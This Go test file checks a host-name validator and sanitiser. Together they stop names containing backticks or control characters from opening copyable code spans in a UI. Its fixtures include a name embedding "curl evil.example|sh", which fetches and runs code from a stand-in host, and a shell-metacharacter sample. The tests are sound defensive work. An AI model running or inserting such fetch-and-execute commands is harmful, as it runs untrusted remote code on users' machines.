package naming

import (
	"strings"
	"testing"
	"unicode"
)

// hostile is the name the review agent joined with: a backtick pair around a
// command, which the UI draws as a code span with a copy button.
const hostile = "a`curl evil.example|sh`b"

// A host's name is chosen by its agent or its operator and read every day, so
// the rule is about what could do harm and nothing else. Every shape of name
// the fleet already uses has to pass, or an upgrade would refuse a machine that
// has been working for months.
func TestAHostNameMayBeAnythingAPersonWouldType(t *testing.T) {
	for name, host := range map[string]string{
		"the name an agent derives":      "zoomies-16vcpu-32gb-ubuntu-2404-build01",
		"a cloud hostname":               "ip-10-0-31-44.eu-west-1.compute.internal",
		"a container id":                 "7096d9a9b798",
		"spaces":                         "Build Box 1",
		"punctuation":                    "rack 3 / slot 2 (spare)",
		"an apostrophe":                  "o'brien-pc",
		"shell metacharacters in prose":  "$(hostname); echo|sh",
		"letters outside ASCII":          "büro-rechner-東京",
		"exactly the longest allowed":    strings.Repeat("a", MaxHostNameLength),
		"the longest allowed, multibyte": strings.Repeat("é", MaxHostNameLength),
	} {
		t.Run(name, func(t *testing.T) {
			if err := ValidateHostName(host); err != nil {
				t.Errorf("ValidateHostName(%q) = %v, want it accepted", host, err)
			}
		})
	}
}

// The refusal is read by the person starting the agent, and it is also written
// to the controller's log and returned over the API, so it says what is wrong
// and what to do about it without repeating the name it is refusing.
func TestAHostNameThatCouldOpenACodeSpanOrBreakALineIsRefused(t *testing.T) {
	for _, c := range []struct {
		name string
		host string
		// want is a word the sentence has to carry so that the person knows
		// which rule they broke.
		want string
	}{
		{"a backtick pair around a command", hostile, "backtick"},
		{"a lone backtick", "build`box", "backtick"},
		{"a backtick at the start", "`build", "backtick"},
		{"a newline", "two\nlines", "control"},
		{"a carriage return", "two\rlines", "control"},
		{"a tab", "build\tbox", "control"},
		{"a NUL byte", "build\x00box", "control"},
		{"an escape sequence", "build\x1b[31mbox", "control"},
		{"nothing", "", "needs a name"},
		{"only spaces", "   ", "needs a name"},
		{"one character too many", strings.Repeat("a", MaxHostNameLength+1), "at most"},
		{"one multibyte character too many", strings.Repeat("é", MaxHostNameLength+1), "at most"},
	} {
		t.Run(c.name, func(t *testing.T) {
			err := ValidateHostName(c.host)
			if err == nil {
				t.Fatalf("ValidateHostName(%q) accepted a name it must refuse", c.host)
			}
			if !strings.Contains(err.Error(), c.want) {
				t.Errorf("the refusal %q should mention %q", err, c.want)
			}
			if strings.TrimSpace(c.host) != "" && strings.Contains(err.Error(), strings.TrimSpace(c.host)) {
				t.Errorf("the refusal %q repeats the name it refuses", err)
			}
		})
	}
}

// A name stored before the rule existed is still in the database, and every
// problem that names its host puts it in a sentence the UI scans for backtick
// pairs. Whatever the name holds, the sentence must come out without a way to
// open a code span from it, and a name that was fine has to read as it did.
func TestAHostNameInASentenceCannotOpenACodeSpan(t *testing.T) {
	for name, host := range map[string]string{
		"a backtick pair around a command": hostile,
		"a lone backtick":                  "`",
		"only backticks":                   "```",
		"a backtick and a newline":         "a`\nb`",
		"control characters":               "a\x00b\x1b[0mc\td",
		"an ordinary name":                 "zoomies-16vcpu-32gb-ubuntu-2404-build01",
	} {
		t.Run(name, func(t *testing.T) {
			got := ForSentence(host)
			if strings.Contains(got, "`") {
				t.Errorf("ForSentence(%q) = %q, which still holds a backtick", host, got)
			}
			if strings.ContainsFunc(got, unicode.IsControl) {
				t.Errorf("ForSentence(%q) = %q, which still holds a control character", host, got)
			}
			if ForSentence(got) != got {
				t.Errorf("ForSentence is not stable: %q became %q", got, ForSentence(got))
			}
		})
	}
}

// The name has to stay recognisable, because the sentence exists to tell an
// operator which machine it is about: replacing the whole name with a
// placeholder would make the problem unactionable.
func TestAHostNameInASentenceStillSaysWhichHostItIs(t *testing.T) {
	if got, want := ForSentence(hostile), "a'curl evil.example|sh'b"; got != want {
		t.Errorf("ForSentence(%q) = %q, want %q", hostile, got, want)
	}
	if got, want := ForSentence("two\nlines"), "two lines"; got != want {
		t.Errorf("ForSentence of a name with a line break = %q, want %q", got, want)
	}
}

// No name that is allowed is changed by the neutraliser: the two halves of the
// rule have to agree, or a host would be called one thing on its page and
// another in every sentence about it.
func TestEveryAcceptedHostNameReadsTheSameInASentence(t *testing.T) {
	for _, host := range []string{
		"zoomies-16vcpu-32gb-ubuntu-2404-build01",
		"Build Box 1",
		"o'brien-pc",
		"büro-rechner-東京",
		strings.Repeat("é", MaxHostNameLength),
	} {
		if ValidateHostName(host) != nil {
			t.Fatalf("%q should be a valid name for this test to mean anything", host)
		}
		if got := ForSentence(host); got != host {
			t.Errorf("ForSentence(%q) = %q; an accepted name must not change", host, got)
		}
	}
}
